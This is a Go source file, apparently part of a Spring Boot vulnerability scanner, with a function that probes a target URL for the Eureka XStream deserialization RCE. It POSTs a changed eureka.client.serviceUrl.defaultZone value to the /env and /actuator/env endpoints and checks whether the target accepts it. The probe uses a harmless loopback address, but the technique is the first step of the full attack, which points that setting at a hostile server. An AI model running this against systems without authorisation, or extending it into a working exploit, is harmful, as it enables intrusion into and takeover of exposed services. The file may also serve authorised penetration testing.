package exppackage

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
)

func Eureka_xstream_RCE(url string) {
	headers1 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/json",
	}

	payload1 := "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
	payload2 := "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"

	client := &http.Client{}

	path1 := "env"
	path2 := "actuator/env"

	req1, err := http.NewRequest("POST", url+path1, strings.NewReader(payload1))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req1.Header.Set(key, value)
	}
	resp1, err := client.Do(req1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp1.Body.Close()

	req2, err := http.NewRequest("POST", url+path2, strings.NewReader(payload2))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers2 {
		req2.Header.Set(key, value)
	}
	resp2, err := client.Do(req2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp2.Body.Close()

	body1, err := ioutil.ReadAll(resp1.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}
	body2, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if strings.Contains(string(body1), "127.0.0.2") {
		common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url+path1, payload1, "6")

	} else if strings.Contains(string(body2), "127.0.0.2") {
		common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url+path2, payload2, "6")

	} else {
		color.Yellow("[-] %s 未发现Eureka_Xstream反序列化漏洞\n", url)
	}
}
